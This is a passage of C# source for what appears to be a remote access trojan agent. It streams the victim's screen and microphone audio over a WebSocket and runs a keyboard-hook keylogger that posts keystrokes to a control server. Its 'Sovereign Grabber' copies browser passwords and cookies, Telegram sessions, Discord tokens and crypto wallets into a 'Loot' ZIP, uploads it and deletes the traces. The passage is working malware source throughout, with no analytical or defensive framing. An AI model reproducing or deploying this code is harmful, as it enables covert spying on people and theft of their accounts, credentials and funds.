                                int blockId = (y / grid) * 1000 + (x / grid);

                                using (var block = fullBmp.Clone(new Rectangle(x, y, w, h), fullBmp.PixelFormat)) {
                                    ulong hash = 5381;
                                    var bd = block.LockBits(new Rectangle(0,0,w,h), ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);
                                    unsafe {
                                        uint* p = (uint*)bd.Scan0;
                                        int len = w * h;
                                        for(int i=0; i<len; i++) hash = ((hash << 5) + hash) + p[i];
                                    }
                                    block.UnlockBits(bd);

                                    if (!hashes.ContainsKey(blockId) || hashes[blockId] != hash) {
                                        hashes[blockId] = hash;
                                        using (var ms = new MemoryStream()) {
                                            block.Save(ms, jc, ep);
                                            byte[] jpeg = ms.ToArray();
                                            // [Type:1][Codec:1][PLen:2] [X:2][Y:2][W:2][H:2] [JPEG...]
                                            byte[] pkt = new byte[12 + jpeg.Length];
                                            pkt[0] = 0x02; // Delta
                                            pkt[1] = 0x00; // Jpeg
                                            BitConverter.GetBytes((ushort)(jpeg.Length + 8)).CopyTo(pkt, 2);
                                            BitConverter.GetBytes((ushort)x).CopyTo(pkt, 4);
                                            BitConverter.GetBytes((ushort)y).CopyTo(pkt, 6);
                                            BitConverter.GetBytes((ushort)w).CopyTo(pkt, 8);
                                            BitConverter.GetBytes((ushort)h).CopyTo(pkt, 10);
                                            Buffer.BlockCopy(jpeg, 0, pkt, 12, jpeg.Length);
                                            await ws.SendAsync(new ArraySegment<byte>(pkt), WebSocketMessageType.Binary, true, CancellationToken.None);
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch {}
                sw.Stop();
                await Task.Delay(Math.Max(5, 33 - (int)sw.ElapsedMilliseconds));
            }
            try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
        }

        static async Task<string> AudioStreamLoop() {
            var ws = new ClientWebSocket();
            try {
                string wsUrl = _server.Replace("http", "ws") + "/api/agent/stream_ws?id=" + _clientId;
                await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
            } catch (Exception ex) { _audioStreaming = false; return "WS Connect failed: " + ex.Message; }

            IMMDeviceEnumerator enumerator = null;
            IMMDevice device = null;
            IAudioClient client = null;
            IAudioCaptureClient capture = null;

            try {
                enumerator = (IMMDeviceEnumerator)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")));
                
                int hr = enumerator.GetDefaultAudioEndpoint(1, 1, out device); // 1=Capture, 1=Communications
                if (hr != 0) {
                    hr = enumerator.GetDefaultAudioEndpoint(1, 0, out device); // Fallback: Console
                    if (hr != 0) throw new Exception("No audio capture endpoint found (HRESULT " + hr.ToString("X") + ")");
                }
                
                Guid iidClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                object obj;
                hr = device.Activate(iidClient, 23, IntPtr.Zero, out obj);
                if (hr != 0) throw new Exception("Device activation failed (HRESULT " + hr.ToString("X") + ")");
                client = (IAudioClient)obj;

                IntPtr pMixFmt;
                client.GetMixFormat(out pMixFmt);
                var mixFmt = (WAVEFORMATEX)Marshal.PtrToStructure(pMixFmt, typeof(WAVEFORMATEX));
                
                // Initialize with mix format to avoid UNSUPPORTED_FORMAT
                hr = client.Initialize(0, 0, 1000000, 0, pMixFmt, Guid.Empty);
                if (hr != 0) throw new Exception("Client init failed (HRESULT " + hr.ToString("X") + "). MixFormat: " + mixFmt.nSamplesPerSec + "Hz " + mixFmt.nChannels + "ch");
                
                Guid iidCapture = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                client.GetService(iidCapture, out obj);
                capture = (IAudioCaptureClient)obj;
                client.Start();

                // Send format header to panel: [0x04][SampleRate (4)][Channels (2)][Bits (2)]
                byte[] hdr = new byte[9];
                hdr[0] = 0x04;
                Buffer.BlockCopy(BitConverter.GetBytes(mixFmt.nSamplesPerSec), 0, hdr, 1, 4);
                Buffer.BlockCopy(BitConverter.GetBytes(mixFmt.nChannels), 0, hdr, 5, 2);
                Buffer.BlockCopy(BitConverter.GetBytes(mixFmt.wBitsPerSample), 0, hdr, 7, 2);
                await ws.SendAsync(new ArraySegment<byte>(hdr), WebSocketMessageType.Binary, true, CancellationToken.None);

                while (_audioStreaming && ws.State == WebSocketState.Open) {
                    uint packetSize;
                    capture.GetNextPacketSize(out packetSize);
                    while (packetSize > 0) {
                        IntPtr dataPtr;
                        uint numFrames, flags;
                        ulong devPos, qpcPos;
                        capture.GetBuffer(out dataPtr, out numFrames, out flags, out devPos, out qpcPos);
                        
                        int byteLen = (int)numFrames * mixFmt.nBlockAlign;
                        if (byteLen > 0) {
                            byte[] raw = new byte[byteLen + 1];
                            raw[0] = 0x03; // Data packet
                            Marshal.Copy(dataPtr, raw, 1, byteLen);
                            await ws.SendAsync(new ArraySegment<byte>(raw), WebSocketMessageType.Binary, true, CancellationToken.None);
                        }
                        capture.ReleaseBuffer(numFrames);
                        capture.GetNextPacketSize(out packetSize);
                    }
                    Thread.Sleep(10);
                }
                return "Finished";
            } catch (Exception ex) { return "Audio loop error: " + ex.Message; }
            finally {
                _audioStreaming = false;
                if (client != null) {
                    try { client.Stop(); } catch {}
                    try { Marshal.ReleaseComObject(client); } catch {}
                }
                if (capture != null) try { Marshal.ReleaseComObject(capture); } catch {}
                if (device != null) try { Marshal.ReleaseComObject(device); } catch {}
                if (enumerator != null) try { Marshal.ReleaseComObject(enumerator); } catch {}
                
                try { 
                    if (ws.State == WebSocketState.Open)
                        ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None).Wait(1000); 
                } catch {}
            }
        }

        static void KeyloggerStreamer() {
            int lastLen = 0;
            while (_keylogRunning) {
                Thread.Sleep(250);
                if (_keylog.Length > lastLen) {
                    string txt = _keylog.ToString();
                    if(txt.Length > lastLen) {
                        string chunk = txt.Substring(lastLen);
                        lastLen = txt.Length;
                        string json = "{\"id\":\"" + Esc(_clientId) + "\",\"tag\":\"keylog_stream\",\"data\":\"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(chunk)) + "\"}";
                        Post(_server + "/api/agent/result", json);
                    }
                }
            }
        }

        static void KeyloggerLoop() {
            try {
                byte[] keyState = new byte[256];
                _kbProc = (n, w, l) => {
                    if (n >= 0 && (int)w == 0x100) {
                        int vk = Marshal.ReadInt32(l);
                        GetKeyboardState(keyState);
                        StringBuilder sb = new StringBuilder(5);
                        uint sc = MapVirtualKey((uint)vk, 0);
                        int res = ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
                        
                        if (res > 0) {
                            _keylog.Append(sb.ToString());
                        } else {
                            string kName = ((System.Windows.Forms.Keys)vk).ToString();
                            _keylog.Append("[" + kName + "]");
                        }
                    }
                    return CallNextHookEx(_hook, n, w, l);
                };
                using (var cp = Process.GetCurrentProcess())
                using (var cm = cp.MainModule) {
                    _hook = SetWindowsHookEx(13, _kbProc, GetModuleHandle(cm.ModuleName), 0);
                }
                KbMsg msg;
                while (_keylogRunning) { GetMessage(out msg, IntPtr.Zero, 0, 0); TranslateMessage(ref msg); DispatchMessage(ref msg); }
            } catch (Exception ex) { Log("Keylogger error: " + ex.Message); }
            finally { if (_hook != IntPtr.Zero) { UnhookWindowsHookEx(_hook); _hook = IntPtr.Zero; } _keylogRunning = false; }
        }

        static string GrabAll() {
            string tempPath = Path.Combine(Path.GetTempPath(), "Sovereign_" + DateTime.Now.Ticks);
            try {
                Directory.CreateDirectory(tempPath);
                Log("Starting Sovereign Grabber...");

                // 1. Browsers
                string browserDir = Path.Combine(tempPath, "Browsers");
                Directory.CreateDirectory(browserDir);
                string[] browsers = { "Chrome", "Edge", "Brave", "Opera", "Vivaldi" };
                foreach (var b in browsers) {
                    string p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), b, "User Data");
                    if (!Directory.Exists(p)) continue;
                    string bDest = Path.Combine(browserDir, b);
                    Directory.CreateDirectory(bDest);
                    try {
                        foreach (string file in Directory.GetFiles(p, "*", SearchOption.AllDirectories)) {
                            string name = Path.GetFileName(file);
                            if (name == "Login Data" || name == "Cookies" || name == "Web Data" || name == "History" || name == "Bookmarks") {
                                string rel = file.Replace(p, "").TrimStart('\\', '/').Replace('\\', '_').Replace('/', '_');
                                File.Copy(file, Path.Combine(bDest, rel), true);
                            }
                        }
                    } catch {}
                }

                // 2. Telegram
                string tg = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata");
                if (Directory.Exists(tg)) {
                    string tgDest = Path.Combine(tempPath, "Telegram");
                    Directory.CreateDirectory(tgDest);
                    try {
                        foreach (string f in Directory.GetFiles(tg)) {
                            string n = Path.GetFileName(f);
                            if (n.Length == 16 || n == "key_data" || n == "settingss") 
                                File.Copy(f, Path.Combine(tgDest, n), true);
                        }
                        foreach (string d in Directory.GetDirectories(tg)) {
                            string n = Path.GetFileName(d);
                            if (n.Length == 16 && n != "user_data") {
                                string sub = Path.Combine(tgDest, n); Directory.CreateDirectory(sub);
                                foreach(string sf in Directory.GetFiles(d)) File.Copy(sf, Path.Combine(sub, Path.GetFileName(sf)), true);
                            }
                        }
                    } catch {}
                }

                // 3. Discord
                string disc = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb");
                if (Directory.Exists(disc)) {
                    string dDest = Path.Combine(tempPath, "Discord");
                    Directory.CreateDirectory(dDest);
                    try {
                        foreach (string f in Directory.GetFiles(disc, "*.ldb")) File.Copy(f, Path.Combine(dDest, Path.GetFileName(f)), true);
                        foreach (string f in Directory.GetFiles(disc, "*.log")) File.Copy(f, Path.Combine(dDest, Path.GetFileName(f)), true);
                    } catch {}
                }

                // 4. Crypto Wallets
                string wallDir = Path.Combine(tempPath, "Wallets");
                Directory.CreateDirectory(wallDir);
                string app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] wallets = { "Exodus\\exodus.wallet", "Electrum\\wallets", "Atomic\\Local Storage\\leveldb" };
                foreach (var w in wallets) {
                    string wp = Path.Combine(app, w);
                    if (File.Exists(wp)) File.Copy(wp, Path.Combine(wallDir, Path.GetFileName(wp)), true);
                    else if (Directory.Exists(wp)) {
                        string wd = Path.Combine(wallDir, Path.GetFileName(wp)); Directory.CreateDirectory(wd);
                        foreach (string f in Directory.GetFiles(wp)) File.Copy(f, Path.Combine(wd, Path.GetFileName(f)), true);
                    }
                }

                // 5. System Info
                File.WriteAllText(Path.Combine(tempPath, "system_info.txt"), GetSysInfo());

                // ZIP and Upload
                string zipFile = Path.Combine(Path.GetTempPath(), "Loot_" + _clientId + "_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".zip");
                ZipFile.CreateFromDirectory(tempPath, zipFile);

                Log("Uploading ZIP: " + Path.GetFileName(zipFile));
                UploadFile(zipFile);
                
                File.Delete(zipFile);
                return "Sovereign Grabber: SUCCESS. Artifacts secured.";
            } catch (Exception ex) {
                return "Grabber Error: " + ex.Message;
            } finally {
                try { if (Directory.Exists(tempPath)) Directory.Delete(tempPath, true); } catch {}
            }
        }

        static void UploadFile(string path) {
            try {
                string url = _server + "/api/agent/upload";
                string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
                byte[] boundaryBytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
                
                var req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "multipart/form-data; boundary=" + boundary;
                req.Headers.Add("X-Client-ID", _clientId);
                req.Timeout = 60000;

                using (var rs = req.GetRequestStream()) {
                    rs.Write(boundaryBytes, 0, boundaryBytes.Length);
                    string header = "Content-Disposition: form-data; name=\"file\"; filename=\"" + Path.GetFileName(path) + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
                    byte[] headerBytes = Encoding.UTF8.GetBytes(header);
                    rs.Write(headerBytes, 0, headerBytes.Length);

                    using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read)) {
                        fs.CopyTo(rs);
                    }

                    byte[] trailer = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
                    rs.Write(trailer, 0, trailer.Length);
                }

                using (var resp = (HttpWebResponse)req.GetResponse()) {
                    Log("Upload result: " + (int)resp.StatusCode);
                }
            } catch (Exception ex) { Log("Upload error: " + ex.Message); }
        }

    }
}
`
